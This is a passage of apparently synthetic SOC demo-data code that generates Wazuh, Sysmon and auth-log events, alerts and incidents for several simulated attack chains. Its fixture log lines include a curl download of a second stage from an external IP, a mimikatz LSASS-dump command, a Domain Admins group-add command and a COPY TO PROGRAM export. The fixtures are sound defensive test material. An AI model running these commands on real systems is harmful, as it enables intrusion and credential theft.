import { Rng } from '../lib/rng';
import type { Alert, AlertStatus, Incident, SecurityEvent, Severity } from '../types/api';
import { analyzeIncident } from '../services/aiLocal';
import { HOST_BY_NAME, type HostFixture } from './fixtures';
import type { DraftEvent } from './logs';
import {
  connTrack,
  cronLine,
  draft,
  isoTime,
  sshdAccepted,
  sshdFailed,
  sshdPam,
  sshdSessionOpen,
  sudoLine,
  sysmonLsassAccess,
  sysmonProcessCreate,
  wazuhAlert,
  windowsSecurityEvent,
} from './logs';

export interface World {
  events: SecurityEvent[];
  alerts: Alert[];
  incidents: Incident[];
  generatedAt: string;
}

const MIN = 60_000;
const HOUR = 3_600_000;

interface EvRec {
  ts: number;
  key: string;
  d: DraftEvent;
}
interface AlRec {
  ts: number;
  key: string;
  eventKeys: string[];
  f: Omit<Alert, 'id' | 'timestamp' | 'event_ids'>;
}
interface InRec {
  start: number;
  updated: number;
  key: string;
  alertKeys: string[];
  f: Omit<Incident, 'id' | 'alert_ids' | 'event_ids' | 'created_at' | 'updated_at' | 'ai'>;
}

export function buildWorld(now = Date.now()): World {
  const rng = new Rng(20261022);
  const evs: EvRec[] = [];
  const als: AlRec[] = [];
  const incs: InRec[] = [];
  let counter = 0;

  const addEv = (ts: number, key: string, d: DraftEvent) => {
    evs.push({ ts, key, d });
  };
  const addAl = (ts: number, eventKeys: string[], f: Omit<Alert, 'id' | 'timestamp' | 'event_ids'>) => {
    const key = `a${als.length + 1}`;
    als.push({ ts, key, eventKeys, f });
    return key;
  };
  const addIn = (
    start: number,
    updated: number,
    alertKeys: string[],
    f: Omit<Incident, 'id' | 'alert_ids' | 'event_ids' | 'created_at' | 'updated_at' | 'ai'>,
  ) => {
    const key = `i${incs.length + 1}`;
    incs.push({ start, updated, key, alertKeys, f });
    return key;
  };

  const h = (name: string): HostFixture => HOST_BY_NAME[name];
  const uid = () => `u${counter++}`;

  /* ============================ 1 · SSH brute force → web-01 ============================ */
  {
    const host = h('web-01');
    const srcIp = '203.0.113.44';
    const users = ['root', 'admin', 'ubuntu', 'deploy', 'oracle', 'test', 'git', 'jenkins', 'postgres'];
    let ts = now - 3.4 * HOUR;
    const keys: string[] = [];
    const mk = (d: DraftEvent, at: number) => {
      const k = uid();
      addEv(at, k, d);
      keys.push(k);
    };
    for (let i = 0; i < 52; i++) {
      const user = users[i % users.length];
      const port = 41000 + rng.int(1, 24000);
      ts += rng.int(6, 26) * 1000;
      mk(
        draft({
          timestamp: isoTime(ts),
          source: 'linux_auth',
          event_type: 'sshd_authentication_failed',
          hostname: host.hostname,
          username: user,
          src_ip: srcIp,
          dst_ip: host.ip,
          severity: 'low',
          raw: sshdFailed(ts, host, user, srcIp, port),
          normalized: {
            service: 'sshd',
            program: 'sshd',
            action: 'failed',
            invalid_user: true,
            src_port: port,
            agent_id: host.agent_id,
          },
          demo: true,
        }),
        ts,
      );
      // wazuh mirrors the same syslog line with a rule match every ~12 attempts
      if (i % 12 === 11) {
        mk(
          draft({
            timestamp: isoTime(ts + 400),
            source: 'wazuh',
            event_type: 'wazuh_alert_rule_5760',
            hostname: host.hostname,
            username: user,
            src_ip: srcIp,
            dst_ip: host.ip,
            severity: 'high',
            raw: wazuhAlert({
              ts: ts + 400,
              host,
              ruleId: '5760',
              level: 10,
              description: `SSHD: Brute force authentication attempt. Source ip: ${srcIp}`,
              groups: ['syslog', 'sshd', 'authentication_failed', 'brute_force'],
              mitre: ['T1110.001'],
              srcIp,
              dstIp: host.ip,
              user,
              fullEvent: sshdFailed(ts, host, user, srcIp, port),
            }),
            normalized: {
              rule_id: '5760',
              rule_level: 10,
              groups: ['syslog', 'sshd', 'authentication_failed', 'brute_force'],
              mitre_technique: ['T1110.001'],
              firedtimes: Math.floor(i / 12) + 1,
              agent_id: host.agent_id,
            },
            demo: true,
          }),
          ts + 400,
        );
      }
    }
    const alertKey = addAl(now - 3.1 * HOUR, keys, {
      severity: 'high',
      rule_name: 'SSHD: Brute force authentication attempt (5760)',
      src_ip: srcIp,
      dst_ip: host.ip,
      username: 'root',
      hostname: host.hostname,
      event_category: 'Authentication',
      detection_reason: `52 failed password attempts from ${srcIp} against ${host.hostname} across ${users.length} usernames in 18 minutes`,
      investigation_status: 'investigating',
      incident_id: null,
      source: 'wazuh',
      demo: true,
    });
    addIn(now - 3.4 * HOUR, now - 92 * MIN, [alertKey], {
      reference: 'INC-2026-0481',
      title: 'SSH brute-force burst from 203.0.113.44 against web-01',
      description:
        'Sustained SSH password guessing from a single internet source against web-01, cycling nine usernames. No successful authentication observed inside this chain; the follow-on compromise is tracked separately.',
      severity: 'high',
      status: 'investigating',
      risk_score: 68,
      assignee: 'a.sardhi',
      rules_triggered: ['5760 — SSHD: Brute force authentication attempt', '5710 — sshd: authentication failure'],
      notes: [
        {
          id: 1,
          author: 'a.sardhi',
          created_at: isoTime(now - 2.6 * HOUR),
          body: 'Confirmed no successful auth from this IP in web-01 auth.log. Deny-listed at the edge, keeping the incident open because the same ASN appears in INC-2026-0482.',
          demo: true,
        },
      ],
      demo: true,
    });
  }

  /* ==================== 2 · successful login after failures + privesc ==================== */
  {
    const host = h('web-01');
    const srcIp = '203.0.113.44';
    let ts = now - 2.7 * HOUR;
    const keys: string[] = [];
    const mk = (d: DraftEvent, at: number) => {
      const k = uid();
      addEv(at, k, d);
      keys.push(k);
      return k;
    };
    for (let i = 0; i < 4; i++) {
      ts += rng.int(9, 30) * 1000;
      mk(
        draft({
          timestamp: isoTime(ts),
          source: 'linux_auth',
          event_type: 'sshd_authentication_failed',
          hostname: host.hostname,
          username: 'deploy',
          src_ip: srcIp,
          dst_ip: host.ip,
          severity: 'low',
          raw: sshdFailed(ts, host, 'deploy', srcIp, 51000 + i * 37, false),
          normalized: { service: 'sshd', action: 'failed', invalid_user: false, agent_id: host.agent_id },
          demo: true,
        }),
        ts,
      );
    }
    ts += 42_000;
    mk(
      draft({
        timestamp: isoTime(ts),
        source: 'wazuh',
        event_type: 'wazuh_alert_rule_5715',
        hostname: host.hostname,
        username: 'deploy',
        src_ip: srcIp,
        dst_ip: host.ip,
        severity: 'critical',
        raw: wazuhAlert({
          ts,
          host,
          ruleId: '5715',
          level: 10,
          description: 'sshd: Successful login from invalid user. ssh completely compromised.',
          groups: ['syslog', 'sshd', 'authentication_success', 'user_added'],
          mitre: ['T1078', 'T1110.003'],
          srcIp,
          dstIp: host.ip,
          user: 'deploy',
          fullEvent: sshdAccepted(ts, host, 'deploy', srcIp, 51337),
        }),
        normalized: {
          rule_id: '5715',
          rule_level: 10,
          mitre_technique: ['T1078', 'T1110.003'],
          authentication: 'success',
          agent_id: host.agent_id,
        },
        demo: true,
      }),
      ts,
    );
    {
      const at = ts + 1200;
      mk(
        draft({
          timestamp: isoTime(at),
          source: 'linux_auth',
          event_type: 'sshd_session_opened',
          hostname: host.hostname,
          username: 'deploy',
          src_ip: srcIp,
          dst_ip: host.ip,
          severity: 'informational',
          raw: sshdSessionOpen(at, host, 'deploy'),
          normalized: { service: 'sshd', action: 'session_opened', agent_id: host.agent_id },
          demo: true,
        }),
        at,
      );
    }
    ts += 3 * MIN;
    const sudoKey = (() => {
      const at = ts;
      const k = uid();
      addEv(
        at,
        k,
        draft({
          timestamp: isoTime(at),
          source: 'linux_auth',
          event_type: 'sudo_privilege_escalation',
          hostname: host.hostname,
          username: 'deploy',
          src_ip: srcIp,
          dst_ip: host.ip,
          severity: 'high',
          raw: sudoLine(at, host, 'deploy', 'pts/0', '/bin/bash'),
          normalized: {
            program: 'sudo',
            target_user: 'root',
            command: '/bin/bash',
            tty: 'pts/0',
            mitre_technique: ['T1548.003'],
            agent_id: host.agent_id,
          },
          demo: true,
        }),
      );
      keys.push(k);
      return k;
    })();
    ts += 90_000;
    addEv(
      ts,
      uid(),
      draft({
        timestamp: isoTime(ts),
        source: 'wazuh',
        event_type: 'wazuh_alert_rule_5501',
        hostname: host.hostname,
        username: 'deploy',
        src_ip: null,
        dst_ip: '203.0.113.98',
        severity: 'high',
        raw: wazuhAlert({
          ts,
          host,
          ruleId: '5501',
          level: 8,
          description: 'First time a script is executed.',
          groups: ['syslog', 'sudo', 'interactive_shell'],
          mitre: ['T1059.004'],
          user: 'deploy',
          dstIp: '203.0.113.98',
          fullEvent: sudoLine(ts, host, 'deploy', 'pts/0', '/bin/bash — then curl -o /tmp/x http://203.0.113.98:8080/stage2'),
        }),
        normalized: { rule_id: '5501', rule_level: 8, command: '/bin/bash', egress_dst: '203.0.113.98', agent_id: host.agent_id },
        demo: true,
      }),
    );
    const alert1 = addAl(now - 2.68 * HOUR, keys.slice(0, 5), {
      severity: 'critical',
      rule_name: 'sshd: successful login after multiple failed attempts (5715)',
      src_ip: srcIp,
      dst_ip: host.ip,
      username: 'deploy',
      hostname: host.hostname,
      event_category: 'Authentication',
      detection_reason: `Account "deploy" authenticated from ${srcIp} after 4 failures in 2 minutes; same source drove the brute-force burst 38 minutes earlier`,
      investigation_status: 'investigating',
      incident_id: null,
      source: 'wazuh',
      demo: true,
    });
    const alert2 = addAl(now - 2.6 * HOUR, [sudoKey], {
      severity: 'high',
      rule_name: 'sudo: interactive root shell spawned (5501)',
      src_ip: null,
      dst_ip: null,
      username: 'deploy',
      hostname: host.hostname,
      event_category: 'Privilege Escalation',
      detection_reason: 'Non-privileged service account opened a root shell via sudo, then performed an outbound download to 203.0.113.98',
      investigation_status: 'acknowledged',
      incident_id: null,
      source: 'wazuh',
      demo: true,
    });
    addIn(now - 2.72 * HOUR, now - 70 * MIN, [alert1, alert2], {
      reference: 'INC-2026-0482',
      title: 'web-01 credential compromise: valid-account login then root shell',
      description:
        'A successful SSH login for the deploy account from 203.0.113.44 followed immediately after failed attempts from the same source, escalated to a root shell via sudo and pulled a second stage from 203.0.113.98. Treated as confirmed unauthorised access.',
      severity: 'critical',
      status: 'investigating',
      risk_score: 91,
      assignee: 'k.iqbal',
      rules_triggered: [
        '5715 — sshd: successful login after multiple failed attempts',
        '5501 — First time a script is executed',
        'T1078 — Valid Accounts',
        'T1548.003 — Sudo and Sudo Caching',
      ],
      notes: [
        {
          id: 1,
          author: 'k.iqbal',
          created_at: isoTime(now - 2.4 * HOUR),
          body: 'web-01 pulled from the load-balancer pool, network-isolated but powered on. deploy credential rotated, outbound to 203.0.113.98 sinkholed at DNS.',
          demo: true,
        },
        {
          id: 2,
          author: 'a.sardhi',
          created_at: isoTime(now - 1.5 * HOUR),
          body: 'Memory image captured. No lateral SSH from web-01 observed yet in the 2h window; continuing with NetFlow review.',
          demo: true,
        },
      ],
      demo: true,
    });
  }

  /* ============================ 3 · password spraying DC ============================ */
  {
    const host = h('win-dc-01');
    const srcIp = '198.51.100.77';
    const targets = ['j.rivera', 't.brooks', 'l.chen', 'm.okafor', 'a.sardhi', 'k.iqbal', 'd.novak', 'sqlagent', 'svc-backup'];
    let ts = now - 5.6 * HOUR;
    const keys: string[] = [];
    for (const user of targets) {
      for (let i = 0; i < 3; i++) {
        ts += rng.int(50, 170) * 1000;
        const k = uid();
        addEv(
          ts,
          k,
          draft({
            timestamp: isoTime(ts),
            source: 'sysmon',
            event_type: `windows_security_logon_failure_${4625}`,
            hostname: host.hostname,
            username: user,
            src_ip: srcIp,
            dst_ip: host.ip,
            severity: i === 0 ? 'low' : 'informational',
            raw: windowsSecurityEvent({
              ts,
              host,
              eventID: 4625,
              keywords: 'Audit Failure',
              message: 'An account failed to log on.',
              fields: {
                'Subject Security ID': 'S-1-0-0',
                'Account For Which Logon Failed': `${user}$ · CORP`,
                'Failure Information': 'Reason Code: 0xC000006A',
                'Status': 'Status Code: 0xC000006D',
                'Logon Type': '3',
                'Source Network Address': srcIp,
                'Authentication Package': 'NTLM',
                'Process Name': '\\Device\\HarddiskVolume2\\InetSvcs\\Web\\w3wp.exe',
              },
            }),
            normalized: {
              event_id: 4625,
              logon_type: 3,
              sub_status: '0xC000006A',
              authentication_package: 'NTLM',
              source_network: srcIp,
              mitre_technique: ['T1110.004'],
            },
            demo: true,
          }),
        );
        keys.push(k);
      }
    }
    const alertKey = addAl(now - 5.1 * HOUR, keys, {
      severity: 'high',
      rule_name: 'Windows: Multiple failed logons from one source across many accounts (4625)',
      src_ip: srcIp,
      dst_ip: host.ip,
      username: null,
      hostname: host.hostname,
      event_category: 'Authentication',
      detection_reason: `27 failed logons with sub-status 0xC000006A across ${targets.length} distinct accounts from ${srcIp} in 48 minutes — one password tried against many users`,
      investigation_status: 'new',
      incident_id: null,
      source: 'wazuh',
      demo: true,
    });
    addIn(now - 5.6 * HOUR, now - 4.4 * HOUR, [alertKey], {
      reference: 'INC-2026-0479',
      title: 'Password spraying against domain accounts via win-dc-01',
      description:
        'Low-and-slow NTLM spray of nine domain accounts from 198.51.100.77 with a single seasonal password pattern. No successful logon identified so far; pacing stayed below the lockout threshold.',
      severity: 'high',
      status: 'new',
      risk_score: 74,
      assignee: null,
      rules_triggered: ['4625 — An account failed to log on', 'T1110.001 — Password Spraying'],
      notes: [],
      demo: true,
    });
  }

  /* ==================== 4 · privilege escalation on win-dc-01 ==================== */
  {
    const host = h('win-dc-01');
    let ts = now - 4.25 * HOUR;
    const keys: string[] = [];
    const mk = (d: DraftEvent, at: number) => {
      const k = uid();
      addEv(at, k, d);
      keys.push(k);
    };
    mk(
      draft({
        timestamp: isoTime(ts),
        source: 'sysmon',
        event_type: 'windows_security_special_privileges',
        hostname: host.hostname,
        username: 'sqlagent',
        src_ip: '10.20.7.30',
        dst_ip: host.ip,
        severity: 'low',
        raw: windowsSecurityEvent({
          ts,
          host,
          eventID: 4672,
          keywords: 'Audit Success',
          message: 'Special privileges assigned to new logon.',
          fields: {
            Subject: 'sqlagent · CORP',
            'Privileges': 'SeDebugPrivilege SeTakeOwnershipPrivilege SeBackupPrivilege SeRestorePrivilege',
            'Logon ID': '0x3F2C41',
          },
        }),
        normalized: { event_id: 4672, privileges: ['SeDebugPrivilege', 'SeTakeOwnershipPrivilege'], mitre_technique: ['T1548.001'] },
        demo: true,
      }),
      ts,
    );
    ts += 4 * MIN;
    mk(
      draft({
        timestamp: isoTime(ts),
        source: 'sysmon',
        event_type: 'windows_security_group_membership_added',
        hostname: host.hostname,
        username: 'svc-jenkins',
        src_ip: null,
        dst_ip: host.ip,
        severity: 'critical',
        raw: windowsSecurityEvent({
          ts,
          host,
          eventID: 4728,
          keywords: 'Audit Success',
          message: 'A member was added to a security-enabled global group.',
          fields: {
            'Subject Security ID': 'S-1-5-21-3261355555-16444-9988-1104',
            'Account Name': 'sqlagent',
            'Account Domain': 'CORP',
            'Group Security ID': 'S-1-5-21-3261355555-16444-9988-512',
            'Group Name': 'Domain Admins',
            'Member Name': 'svc-jenkins',
            'Extra Info': 'Privilege reserved for administrators',
          },
        }),
        normalized: {
          event_id: 4728,
          group_name: 'Domain Admins',
          member_name: 'svc-jenkins',
          performer: 'sqlagent',
          mitre_technique: ['T1098.001'],
        },
        demo: true,
      }),
      ts,
    );
    ts += 30_000;
    mk(
      draft({
        timestamp: isoTime(ts),
        source: 'sysmon',
        event_type: 'sysmon_process_create_net_exe',
        hostname: host.hostname,
        username: 'sqlagent',
        src_ip: null,
        dst_ip: null,
        severity: 'high',
        raw: sysmonProcessCreate({
          ts,
          host,
          image: 'C:\\Windows\\System32\\net.exe',
          commandLine: 'net group "Domain Admins" svc-jenkins /add /domain',
          parent: 'C:\\Windows\\System32\\cmd.exe',
          user: 'sqlagent',
          hash: 'MD5=E4E5F1D0C59F24B7A6A2A4C41B0C1F77',
        }),
        normalized: {
          event_id: 1,
          provider: 'Microsoft-Windows-Sysmon',
          image: 'C:\\Windows\\System32\\net.exe',
          parent_image: 'C:\\Windows\\System32\\cmd.exe',
          command_line: 'net group "Domain Admins" svc-jenkins /add /domain',
          mitre_technique: ['T1098', 'T1078.002'],
        },
        demo: true,
      }),
      ts,
    );
    const a1 = addAl(now - 4.2 * HOUR, keys, {
      severity: 'critical',
      rule_name: 'Windows: Member added to Domain Admins global group (4728)',
      src_ip: null,
      dst_ip: host.ip,
      username: 'svc-jenkins',
      hostname: host.hostname,
      event_category: 'Privilege Escalation',
      detection_reason:
        'Service account sqlagent added svc-jenkins to Domain Admins from a SQL agent logon workstation — a path no DB service account has used in the last 90 days',
      investigation_status: 'investigating',
      incident_id: null,
      source: 'wazuh',
      demo: true,
    });
    const a2 = addAl(now - 4.18 * HOUR, [keys[0]], {
      severity: 'high',
      rule_name: 'Windows: SeDebugPrivilege / SeTakeOwnershipPrivilege assigned (4672)',
      src_ip: '10.20.7.30',
      dst_ip: host.ip,
      username: 'sqlagent',
      hostname: host.hostname,
      event_category: 'Privilege Escalation',
      detection_reason: 'Debug and take-ownership privileges assigned to a non-interactive service logon',
      investigation_status: 'new',
      incident_id: null,
      source: 'sysmon',
      demo: true,
    });
    addIn(now - 4.3 * HOUR, now - 2.1 * HOUR, [a1, a2], {
      reference: 'INC-2026-0478',
      title: 'Domain privilege escalation: svc-jenkins added to Domain Admins',
      description:
        'A SQL service account performed a domain-group membership change granting svc-jenkins Domain Admins rights. Highest-priority chain in the environment: implies both credential theft and active directory write access.',
      severity: 'critical',
      status: 'investigating',
      risk_score: 95,
      assignee: 'd.novak',
      rules_triggered: [
        '4728 — A member was added to a security-enabled global group',
        '4672 — Special privileges assigned to new logon',
        'Sysmon EID 1 — net.exe group modification',
        'T1098.001 — Account Manipulation: Additional Cloud Roles/Group',
      ],
      notes: [
        {
          id: 1,
          author: 'd.novak',
          created_at: isoTime(now - 3.8 * HOUR),
          body: 'Membership reverted, svc-jenkins and sqlagent disabled, all AD sessions revoked. KRBTGT double reset scheduled for the next change window.',
          demo: true,
        },
      ],
      demo: true,
    });
  }

  /* ============================ 5 · port scan ============================ */
  {
    const srcIp = '198.51.100.23';
    const targets = ['web-01', 'web-02', 'db-prod-01'];
    let ts = now - 7.4 * HOUR;
    const keys: string[] = [];
    const ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 993, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9200, 11211, 27017];
    for (let i = 0; i < 96; i++) {
      const host = h(targets[i % targets.length]);
      ts += rng.int(2, 9) * 1000;
      const port = ports[i % ports.length];
      const k = uid();
      addEv(
        ts,
        k,
        draft({
          timestamp: isoTime(ts),
          source: 'wazuh',
          event_type: 'firewall_blocked_connection',
          hostname: host.hostname,
          username: null,
          src_ip: srcIp,
          dst_ip: host.ip,
          severity: 'informational',
          raw: connTrack(ts, host, srcIp, 60000 - i * 7, host.ip, port),
          normalized: {
            firewall: 'ufw',
            action: 'blocked',
            protocol: 'TCP',
            dst_port: port,
            syn_only: true,
            agent_id: host.agent_id,
          },
          demo: true,
        }),
      );
      keys.push(k);
    }
    const a = addAl(now - 7.1 * HOUR, keys, {
      severity: 'high',
      rule_name: 'Firewall: Multiple connection attempts to different ports at once (5712)',
      src_ip: srcIp,
      dst_ip: null,
      username: null,
      hostname: 'web-01',
      event_category: 'Reconnaissance',
      detection_reason: `96 blocked SYN attempts touching ${ports.length} distinct service ports across web-01, web-02 and db-prod-01 in 14 minutes`,
      investigation_status: 'false_positive',
      incident_id: null,
      source: 'wazuh',
      demo: true,
    });
    addIn(now - 7.5 * HOUR, now - 6.2 * HOUR, [a], {
      reference: 'INC-2026-0475',
      title: 'Perimeter port scan across web and database segments',
      description:
        'Sequential service enumeration from 198.51.100.23 against three segments. All attempts were blocked. Closed as false positive: source matched the quarterly authorised penetration-test scanner registered with the SOC.',
      severity: 'high',
      status: 'closed',
      risk_score: 38,
      assignee: 'm.okafor',
      rules_triggered: ['5712 — Multiple connection attempts to different ports at once'],
      notes: [
        {
          id: 1,
          author: 'm.okafor',
          created_at: isoTime(now - 6.3 * HOUR),
          body: 'Matched to PT-2026-Q4 engagement (scope letter attached in ticket CHG-4412). Marked false positive and the scanner IP was allow-listed for the engagement window only.',
          demo: true,
        },
      ],
      demo: true,
    });
  }

  /* ====================== 6 · mimikatz / LSASS on L-TP-0221 ====================== */
  {
    const host = h('L-TP-0221');
    let ts = now - 68 * MIN;
    const keys: string[] = [];
    const mk = (d: DraftEvent, at: number) => {
      const k = uid();
      addEv(at, k, d);
      keys.push(k);
    };
    mk(
      draft({
        timestamp: isoTime(ts),
        source: 'sysmon',
        event_type: 'sysmon_process_create',
        hostname: host.hostname,
        username: 'l.chen',
        src_ip: null,
        dst_ip: null,
        severity: 'high',
        raw: sysmonProcessCreate({
          ts,
          host,
          image: 'C:\\Users\\l.chen\\Downloads\\project-tools\\mimikatz.exe',
          commandLine: 'mimikatz.exe "privilege::debug" "sekurl::lsassdump" "exit"',
          parent: 'C:\\Windows\\System32\\cmd.exe',
          user: 'l.chen',
          hash: 'SHA256=1B9A8E4D6D0C4F6A2E9C0D4B7A5F8E1C3D6A9F0B2C5E8A1D4F7B0C3E6A9D2F5',
        }),
        normalized: {
          event_id: 1,
          provider: 'Microsoft-Windows-Sysmon',
          image: 'C:\\Users\\l.chen\\Downloads\\project-tools\\mimikatz.exe',
          parent_image: 'C:\\Windows\\System32\\cmd.exe',
          command_line: 'mimikatz.exe "privilege::debug" "sekurl::lsassdump" "exit"',
          hashes: 'SHA256=1B9A8E4D6D0C4F6A2E9C0D4B7A5F8E1C3D6A9F0B2C5E8A1D4F7B0C3E6A9D2F5',
          mitre_technique: ['T1003.001'],
        },
        demo: true,
      }),
      ts,
    );
    ts += 11_000;
    mk(
      draft({
        timestamp: isoTime(ts),
        source: 'sysmon',
        event_type: 'sysmon_process_access_lsass',
        hostname: host.hostname,
        username: 'l.chen',
        src_ip: null,
        dst_ip: null,
        severity: 'critical',
        raw: sysmonLsassAccess({
          ts,
          host,
          sourceImage: 'C:\\Users\\l.chen\\Downloads\\project-tools\\mimikatz.exe',
          user: 'l.chen',
          granted: '0x147A',
        }),
        normalized: {
          event_id: 10,
          provider: 'Microsoft-Windows-Sysmon',
          source_image: 'C:\\Users\\l.chen\\Downloads\\project-tools\\mimikatz.exe',
          target_image: 'C:\\Windows\\System32\\lsass.exe',
          granted_access: '0x147A',
          rule_name: 'ACCESS_TO_LSASS',
          mitre_technique: ['T1003.001'],
        },
        demo: true,
      }),
      ts,
    );
    ts += 26_000;
    mk(
      draft({
        timestamp: isoTime(ts),
        source: 'wazuh',
        event_type: 'wazuh_alert_rule_18104',
        hostname: host.hostname,
        username: 'l.chen',
        src_ip: null,
        dst_ip: null,
        severity: 'critical',
        raw: wazuhAlert({
          ts,
          host,
          ruleId: '18104',
          level: 12,
          description: 'WinEvtLog: credential access — LSASS memory read by unsigned binary',
          groups: ['windows', 'security', 'credential_access', 'sysmon'],
          mitre: ['T1003.001'],
          user: 'l.chen',
          fullEvent: `Process ${'C:\\Users\\l.chen\\Downloads\\project-tools\\mimikatz.exe'} opened ${'C:\\Windows\\System32\\lsass.exe'} with 0x147A`,
        }),
        normalized: { rule_id: '18104', rule_level: 12, win_channel: 'Microsoft-Windows-Sysmon/Operational', agent_id: host.agent_id },
        demo: true,
      }),
      ts,
    );
    const a = addAl(now - 66 * MIN, keys, {
      severity: 'critical',
      rule_name: 'Sysmon: LSASS memory accessed by unsigned binary (EID 10)',
      src_ip: null,
      dst_ip: null,
      username: 'l.chen',
      hostname: host.hostname,
      event_category: 'Credential Access',
      detection_reason:
        'mimikatz.exe executed from a user-writable Downloads path and opened lsass.exe with GrantedAccess 0x147A (VM_READ | QUERY_INFORMATION)',
      investigation_status: 'new',
      incident_id: null,
      source: 'sysmon',
      demo: true,
    });
    addIn(now - 70 * MIN, now - 40 * MIN, [a], {
      reference: 'INC-2026-0484',
      title: 'Credential dumping via Mimikatz on L-TP-0221',
      description:
        'Unsigned credential-theft binary run from a user-writable path on an engineering laptop, followed by LSASS memory access. Endpoint isolated. Domain accounts that logged on to this host must be treated as exposed.',
      severity: 'critical',
      status: 'new',
      risk_score: 88,
      assignee: null,
      rules_triggered: [
        'Sysmon EID 1 — Process create (mimikatz.exe)',
        'Sysmon EID 10 — Process accessed LSASS',
        '18104 — WinEvtLog: credential access',
        'T1003.001 — OS Credential Dumping: LSASS Memory',
      ],
      notes: [
        {
          id: 1,
          author: 'a.sardhi',
          created_at: isoTime(now - 45 * MIN),
          body: 'Host isolated with 802.1x quarantine, left powered on for Volatility capture. Enumerating interactive logon history on the endpoint before deciding on domain-wide resets.',
          demo: true,
        },
      ],
      demo: true,
    });
  }

  /* ==================== 7 · suspicious sudo on the bastion ==================== */
  {
    const host = h('jump-01');
    let ts = now - 21 * HOUR;
    const keys: string[] = [];
    for (const cmd of ['/bin/su -', '/usr/bin/vi /etc/hosts', '/bin/bash', '/usr/bin/psql -U postgres']) {
      ts += rng.int(2, 14) * MIN;
      const k = uid();
      addEv(
        ts,
        k,
        draft({
          timestamp: isoTime(ts),
          source: 'linux_auth',
          event_type: 'sudo_command',
          hostname: host.hostname,
          username: 'svc-backup',
          src_ip: '10.20.9.8',
          dst_ip: host.ip,
          severity: cmd === '/bin/bash' ? 'low' : 'informational',
          raw: sudoLine(ts, host, 'svc-backup', cmd === '/bin/bash' ? 'pts/2' : 'none', cmd),
          normalized: { program: 'sudo', target_user: 'root', command: cmd, tty: cmd === '/bin/bash' ? 'pts/2' : 'none', agent_id: host.agent_id },
          demo: true,
        }),
      );
      keys.push(k);
    }
    const a = addAl(now - 19.5 * HOUR, keys, {
      severity: 'low',
      rule_name: 'sudo: interactive shell from a service account',
      src_ip: null,
      dst_ip: null,
      username: 'svc-backup',
      hostname: host.hostname,
      event_category: 'Privilege Escalation',
      detection_reason: 'Non-interactive service account svc-backup spawned an interactive root shell (TTY=pts/2) on the bastion',
      investigation_status: 'resolved',
      incident_id: null,
      source: 'wazuh',
      demo: true,
    });
    addIn(now - 21.5 * HOUR, now - 17 * HOUR, [a], {
      reference: 'INC-2026-0471',
      title: 'Interactive root shell from svc-backup on jump-01',
      description:
        'Backup service account opened an interactive root shell on the bastion. Resolved as approved maintenance: matched a change ticket and the operator was verified, but the sudo policy was tightened afterwards.',
      severity: 'low',
      status: 'resolved',
      risk_score: 26,
      assignee: 'm.okafor',
      rules_triggered: ['sudo: interactive shell from a service account'],
      notes: [
        {
          id: 1,
          author: 'm.okafor',
          created_at: isoTime(now - 18 * HOUR),
          body: 'Verified against CHG-4388 (Veeam repository migration). Resolved. Follow-up: restrict svc-backup to NOPASSWD specific commands instead of ALL.',
          demo: true,
        },
      ],
      demo: true,
    });
  }

  /* ==================== 8 · anomalous outbound transfer (freshest) ==================== */
  {
    const host = h('db-prod-01');
    const dst = '203.0.113.98';
    let ts = now - 44 * MIN;
    const keys: string[] = [];
    const mk = (d: DraftEvent, at: number) => {
      const k = uid();
      addEv(at, k, d);
      keys.push(k);
    };
    mk(
      draft({
        timestamp: isoTime(ts),
        source: 'wazuh',
        event_type: 'postgres_statement_copy_to',
        hostname: host.hostname,
        username: 'postgres',
        src_ip: host.ip,
        dst_ip: null,
        severity: 'low',
        raw: `${isoTime(ts)} db-prod-01 postgres[14]: LOG: statement: COPY public.audit_events TO PROGRAM 'gzip > /tmp/audit_events.csv.gz'`,
        normalized: {
          process: 'postgres',
          statement: 'COPY public.audit_events TO PROGRAM',
          rows: 1284003,
          bytes: 412_900_000,
          agent_id: host.agent_id,
        },
        demo: true,
      }),
      ts,
    );
    ts += 6 * MIN;
    mk(
      draft({
        timestamp: isoTime(ts),
        source: 'wazuh',
        event_type: 'egress_volume_anomaly',
        hostname: host.hostname,
        username: 'postgres',
        src_ip: host.ip,
        dst_ip: dst,
        severity: 'high',
        raw: wazuhAlert({
          ts,
          host,
          ruleId: '530',
          level: 9,
          description: 'Outbound transfer exceeds host baseline: 394 MB to a never-seen destination.',
          groups: ['network', 'exfiltration', 'demo_generator'],
          mitre: ['T1048.002', 'TA0011'],
          dstIp: dst,
          srcIp: host.ip,
          user: 'postgres',
          fullEvent: `db-prod-01:44332 -> ${dst}:443 bytes_out=412900000 duration=212s tls_sni=absent`,
        }),
        normalized: {
          rule_id: '530',
          bytes_out: 412_900_000,
          baseline_mean_bytes: 9_400_000,
          destination: dst,
          port: 443,
          tls_sni: 'absent',
          mitre_technique: ['T1048.002'],
          agent_id: host.agent_id,
        },
        demo: true,
      }),
      ts,
    );
    const a = addAl(now - 37 * MIN, keys, {
      severity: 'high',
      rule_name: 'Exfiltration: outbound volume 41x above host baseline (530)',
      src_ip: host.ip,
      dst_ip: dst,
      username: 'postgres',
      hostname: host.hostname,
      event_category: 'Exfiltration',
      detection_reason: `394 MB pushed from ${host.hostname} to ${dst}:443 without TLS SNI, 41x above the 30-day baseline for this host`,
      investigation_status: 'acknowledged',
      incident_id: null,
      source: 'wazuh',
      demo: true,
    });
    addIn(now - 44 * MIN, now - 30 * MIN, [a], {
      reference: 'INC-2026-0485',
      title: 'Anomalous 394 MB outbound transfer from db-prod-01',
      description:
        'A bulk COPY of the audit_events table was followed by a large outbound HTTPS push to a first-seen external address with no SNI. Potential data egress from the production database; not yet confirmed as attacker-driven.',
      severity: 'high',
      status: 'new',
      risk_score: 79,
      assignee: null,
      rules_triggered: ['530 — Outbound transfer exceeds host baseline', 'T1048.002 — Exfiltration Over Alternative Protocol'],
      notes: [],
      demo: true,
    });
  }

  /* ==================== standalone alerts without incidents ==================== */
  const standaloneDefs: {
    ago: number;
    severity: Severity;
    rule: string;
    category: string;
    reason: string;
    host: string;
    srcIp: string | null;
    dstIp: string | null;
    user: string | null;
    status: AlertStatus;
    source: SecurityEvent['source'];
  }[] = [
    {
      ago: 26, severity: 'informational', rule: 'Wazuh: Agent buffer is full (500)', category: 'Integrity Monitoring',
      reason: 'Agent 011 reported a 15% buffer backlog for 4 minutes during index rotation', host: 'L-TP-0142', srcIp: null,
      dstIp: '10.20.9.20', user: null, status: 'resolved', source: 'wazuh',
    },
    {
